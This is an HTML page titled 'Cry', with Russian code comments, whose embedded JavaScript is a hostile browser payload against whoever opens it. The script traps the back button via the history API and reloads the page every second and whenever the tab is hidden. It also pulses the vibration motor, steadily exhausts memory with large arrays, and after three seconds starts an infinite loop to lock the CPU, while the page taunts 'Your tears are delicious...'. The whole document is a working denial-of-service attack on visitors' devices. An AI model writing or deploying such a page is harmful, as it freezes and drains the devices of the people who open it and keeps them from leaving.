<html>
  <head>
    <title>Cry</title>
    <script type="text/javascript">
      // Запрещаем выход с помощью history API
      history.pushState(null, "", location.href);
      window.onpopstate = function () {
        history.pushState(null, "", location.href);
      };

      // Бесконечное обновление страницы через таймер
      setInterval(function () {
        location.reload();
      }, 1000); // Обновление каждую секунду

      // Блокируем скрытие вкладки (следим за активностью)
      document.addEventListener('visibilitychange', function () {
        if (document.hidden) location.reload();
      });

      // Генерация вибраций через Web API (если включён вибромотор)
      if (navigator.vibrate) {
        setInterval(function () {
          navigator.vibrate([500, 300, 500]); // Вибрация каждые 1.3 секунды
        }, 1300);
      }

      // Заполняем память устройства бесполезными данными
      let wasteMemory = [];
      setInterval(function () {
        wasteMemory.push(new Array(1000000).fill("CRY")); // 1 миллион строк
      }, 500);

      // Бесконечный цикл для нагрузки на процессор
      function overloadCPU() {
        while (true) {
          console.log("Your tears are delicious...");
        }
      }
      setTimeout(overloadCPU, 3000); // Запускаем через 3 секунды

    </script>
  </head>
  <body style="background-color: black; color: red; text-align: center; margin-top: 20%;">
    <h1 style="font-size: 80px;">CRY</h1>
    <p>Your tears are delicious...</p>
  </body>
</html>
